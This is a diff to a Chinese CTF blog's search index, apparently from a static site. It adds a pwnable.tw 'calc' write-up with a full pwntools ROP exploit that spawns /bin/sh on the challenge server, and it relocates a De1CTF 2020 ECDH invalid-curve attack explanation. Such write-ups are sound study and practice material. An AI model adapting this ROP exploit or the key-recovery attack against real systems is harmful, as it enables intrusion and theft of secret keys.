@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>pwnable.tw calc</title>
+      <link href="/2020/10/12/pwnable_calc/"/>
+      <url>/2020/10/12/pwnable_calc/</url>
+      
+        <content type="html"><![CDATA[<p>找到程序中可疑的写逻辑，即在parse_expr函数中的35行<code>a2[v4 + 1] = v9;</code>这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1”这类畸形输入控制a2（这里可以根据输入来模拟一下程序的执行流就会发现确实如此）。</p><p>尝试rop直接调用system函数，发现没有，/bin/sh字符串也没有，因此只能利用小gadget来完成system的系统调用。总体利用思路就是第一次输入先泄露ebp，获取栈地址信息。之后不断改变栈上的数据，构造rop链，需要注意的地方是计算栈上/bin/sh的地址。最后发送一个回车符（退出while循环）即可令程序执行我们的rop链完成攻击。</p><p>完整exp链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./calc')</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080493FF")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x08049432")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" ===\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">ebp = int(p.recvuntil(<span class="string">'\n'</span>).strip()) + pow(<span class="number">2</span>,<span class="number">32</span>)</span><br><span class="line">input_base = ebp - <span class="number">1068</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x0805c34b : pop eax ; ret</span></span><br><span class="line"><span class="string">0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08049a21 : int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"bin_addr: "</span>+hex(input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x0805c34b</span>, <span class="number">11</span>, <span class="number">0x080701d0</span>, <span class="number">0</span>, <span class="number">0</span>, input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>, <span class="number">0x08049a21</span>, u32(<span class="string">'/bin'</span>), u32(<span class="string">'/sh\x00'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(target)):</span><br><span class="line">    p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i))</span><br><span class="line">    num = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> target[i]&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">        target[i] -= pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> num == target[i]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;target[i]:</span><br><span class="line">        d = num - target[i]</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'-'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = target[i] - num</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'+'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+            <tag> ROP </tag>
+            
+            <tag> vlun </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>pwnable.tw orw</title>
       <link href="/2020/10/11/pwnable_orw/"/>
       <url>/2020/10/11/pwnable_orw/</url>
@@ -88,6 +111,29 @@
     
     
     <entry>
+      <title>De1CTF[2020]-ECDH</title>
+      <link href="/2020/05/11/De1CTF%5B2020%5D-ECDH/"/>
+      <url>/2020/05/11/De1CTF%5B2020%5D-ECDH/</url>
+      
+        <content type="html"><![CDATA[<p>定位到题目源码中最关键的部分——密钥交换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">r = zero</span><br><span class="line">tmp = p</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        r = add(r,tmp)</span><br><span class="line">    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">key = (x,y)</span><br><span class="line">result = mul(self.secret,key)</span><br><span class="line">self.key = self.pointToKeys(result)</span><br><span class="line">self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure><p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p><p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p><p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> 密码学 </tag>
+            
+            <tag> ECDH </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>De1CTF[2020]-easyRSA</title>
       <link href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/"/>
       <url>/2020/05/11/De1CTF%5B2020%5D-easyRSA/</url>
@@ -124,29 +170,6 @@
             <tag> 密码学 </tag>
             
             <tag> LFSR </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>De1CTF[2020]-ECDH</title>
-      <link href="/2020/05/11/De1CTF%5B2020%5D-ECDH/"/>
-      <url>/2020/05/11/De1CTF%5B2020%5D-ECDH/</url>
-      
-        <content type="html"><![CDATA[<p>定位到题目源码中最关键的部分——密钥交换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">r = zero</span><br><span class="line">tmp = p</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        r = add(r,tmp)</span><br><span class="line">    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">key = (x,y)</span><br><span class="line">result = mul(self.secret,key)</span><br><span class="line">self.key = self.pointToKeys(result)</span><br><span class="line">self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure><p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p><p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p><p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> 密码学 </tag>
-            
-            <tag> ECDH </tag>
             
         </tags>
       
